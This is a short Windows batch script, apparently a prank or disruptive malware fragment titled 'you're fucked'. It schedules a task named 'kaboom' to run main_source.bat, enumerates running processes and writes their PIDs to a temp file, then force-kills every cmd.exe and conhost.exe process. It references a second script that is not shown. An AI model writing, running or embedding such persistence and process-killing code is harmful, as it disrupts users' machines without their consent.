echo on && setlocal
color 0A
title you're fucked
schtasks /create /sc once /ri 1 /tn kaboom /tr main_source.bat /st %time:~0,5% /f
tasklist /v /fi "STATUS eq running" /fi "imagename ne cmd.exe" /fi "imagename ne conhost.exe" /fo list | find "PID:">tmp.txt
for /f "tokens=2, 20" %%a in (tmp.txt) do (echo %%a)
pause
erase tmp.txt
taskkill /f /im cmd.exe /im conhost.exe